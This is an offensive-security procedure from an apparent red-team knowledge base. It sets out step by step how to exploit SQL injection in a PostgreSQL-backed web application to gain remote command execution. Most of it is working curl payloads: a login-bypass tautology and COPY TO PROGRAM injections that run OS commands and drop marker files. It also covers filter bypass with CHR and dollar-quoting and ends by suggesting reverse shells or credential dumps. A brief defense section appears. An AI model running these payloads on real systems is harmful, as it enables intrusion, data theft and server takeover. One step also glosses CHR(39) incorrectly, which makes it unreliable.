---
id: 0023c0bf-05fc-46c4-b1fc-4a5dcd0bad3f
name: PostgreSQL-Command-Execution-via-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.078828+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Bypass Filter]]'
  - '[[tags/PostgreSQL Command execution]]'
  - '[[tags/PostgreSQL injection]]'
  - '[[tags/Quotes]]'
commands:
  - '[[commands/curl-basic-sql-injection-test]]'
  - '[[commands/curl-postgresql-rce-injection]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# PostgreSQL-Command-Execution-via-Injection

## Summary

This procedure outlines how to exploit a SQL injection vulnerability in a web application connected to a PostgreSQL database to achieve remote command execution (RCE). By crafting payloads that bypass input filters using the CHR function for character concatenation and dollar-quoted strings to encapsulate commands, an attacker can inject malicious SQL that leverages PostgreSQL's COPY command with the PROGRAM option to execute operating system commands on the database server, assuming the database user has superuser privileges or the necessary extensions enabled.

## Description

PostgreSQL SQL injection targets applications that fail to properly sanitize user input in SQL queries, allowing attackers to append or modify queries. This procedure focuses on achieving RCE by injecting a payload that uses the COPY TO PROGRAM directive, which executes shell commands if the database role has sufficient privileges (e.g., superuser). Filters blocking direct quotes or special characters are bypassed by constructing strings dynamically with CHR (converting ASCII codes to characters) and using dollar-quoted literals to avoid escaping issues. This technique is applicable in scenarios where the application performs queries like SELECT * FROM users WHERE id = '$input', and the backend is PostgreSQL on a Linux server. Successful exploitation can lead to data exfiltration, privilege escalation, or full server compromise. Prerequisites include identifying a blind or error-based injection point and confirming PostgreSQL version supports the features used (e.g., COPY PROGRAM in versions 9.3+).

## Requirements

1. Network access to the vulnerable web application endpoint.
2. Identification of a SQL injection point (e.g., via parameter in GET/POST request).
3. Knowledge of the database type (PostgreSQL) and basic schema (e.g., table/column names for union-based if needed).
4. Tools like curl for sending HTTP requests with payloads.
5. Database user privileges allowing COPY PROGRAM (often requires superuser; test via error messages).
6. A wordlist or ASCII knowledge for CHR-based bypasses.

## Defense

- Implement strict input validation and sanitization, using prepared statements or parameterized queries to separate code from data.
- Enforce least privilege principles: Run the application database user with minimal permissions, disabling superuser access and extensions like plperlu.
- Use web application firewalls (WAFs) to detect and block common SQL injection patterns, including encoded payloads.
- Enable database logging (e.g., log_statement = 'all' in postgresql.conf) and monitor for anomalous queries involving COPY or CHR.
- Regularly audit and patch PostgreSQL to the latest version, and avoid exposing databases directly to the internet.

## Objectives

1. Confirm SQL injection vulnerability in the target application.
2. Bypass input filters using CHR concatenation to construct malicious strings.
3. Inject a dollar-quoted payload to execute arbitrary OS commands via COPY TO PROGRAM.
4. Verify command execution through output or side effects (e.g., file creation).
5. Achieve initial RCE for further lateral movement or data access.

## Instructions

### Step 1: Test for SQL Injection Vulnerability

**Context**: Begin by confirming the presence of a SQL injection vulnerability in a user-controlled parameter, such as a search field or ID input. This step uses a basic payload to trigger a database error or delay, indicating injectable SQL. If successful, proceed to payload crafting; if not, the endpoint may not be vulnerable or requires blind techniques.

**Command** ([[commands/curl-basic-sql-injection-test]]):

```bash
curl -X POST http://target.com/login -d "username=admin' OR 1=1--" -v
```

> This sends a classic tautology payload to bypass authentication or alter query logic. The single quote closes the string, OR 1=1 makes the condition true, and -- comments out the rest. Expected output includes a successful response (e.g., login bypass) or a PostgreSQL error revealing the backend (e.g., "syntax error at or near '"'"). If no error but behavior changes (e.g., all records returned), injection is confirmed.

### Step 2: Bypass Filters with CHR Concatenation

**Context**: Many applications filter direct quotes or keywords. Use PostgreSQL's CHR function to build strings from ASCII values (e.g., CHR(39) for single quote ')'), concatenating with || to form payload components without triggering filters. This step constructs a basic quote for further injection.

**Code** ([[codes/PostgreSQL-CHR-Concatenation-Example]]):

```sql
SELECT CHR(65)||CHR(66)||CHR(67);
```

> Execute this in a safe environment or inject it to test (e.g., via union select). It returns 'ABC', demonstrating concatenation. In a real injection, build something like CHR(39)||' OR '||CHR(39) to create ' OR '. Expected output: The constructed string appears in query results or causes expected behavior change. If filters block ||, use alternative concatenation like || or case expressions.

### Step 3: Utilize Dollar-Quoted Strings for Payload Encapsulation

**Context**: To include complex strings with special characters (e.g., commands with spaces or quotes) without escaping, use PostgreSQL's dollar-quoted literals ($$ or $TAG$). This avoids quote conflicts in injections and allows embedding shell commands cleanly. Test by selecting a sample string that mimics a command.

**Code** ([[codes/PostgreSQL-Dollar-Quoted-Strings-Example]]):

```sql
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```

> This selects literal strings without interpreting delimiters inside. In injection, use $$ls -la$$ to embed 'ls -la' directly. Expected output: The exact string returned in query results. If the app echoes query output, you'll see the string; otherwise, use blind techniques like time delays (e.g., $$pg_sleep(5)$$).

### Step 4: Craft and Inject RCE Payload

**Context**: Combine the above to inject a full RCE payload using COPY TO PROGRAM, which executes the command and writes output to a table or file. Assume a union-based injection point; adjust for blind if needed. The payload closes the original query, unions a null, and appends the malicious COPY.

**Command** ([[commands/curl-postgresql-rce-injection]]):

```bash
curl -X POST http://target.com/search -d "q=1'; COPY (SELECT '') TO PROGRAM 'ls -la'; --" -v
```

> This injects after closing the quote with ', executes COPY to run 'ls -la', and comments out the rest. For filter bypass, replace direct command with CHR-built or dollar-quoted version, e.g., '1'; COPY (SELECT $$ls -la$$) TO PROGRAM 'id'; --. Expected output: Server-side command runs (no direct response), but verify via side effects like a new file or error. If successful, the command executes as the postgres user.

### Step 5: Verify and Escalate

**Context**: Confirm RCE by injecting a payload that creates a detectable artifact, such as writing to a web-readable directory. If output is captured (e.g., via INTO a temp table), retrieve it in a follow-up query.

**Command** ([[commands/curl-postgresql-rce-injection]]):

```bash
curl -X POST http://target.com/search -d "q=1'; COPY (SELECT '') TO PROGRAM 'touch /tmp/pwned; id > /tmp/whoami.txt'; --" -v
```

> This runs 'touch /tmp/pwned; id > /tmp/whoami.txt' to create files. Expected output: No immediate response, but check server access (if pivoted) for /tmp/pwned and contents of whoami.txt showing postgres user. Success indicates RCE; escalate by injecting reverse shell commands or credential dumps.
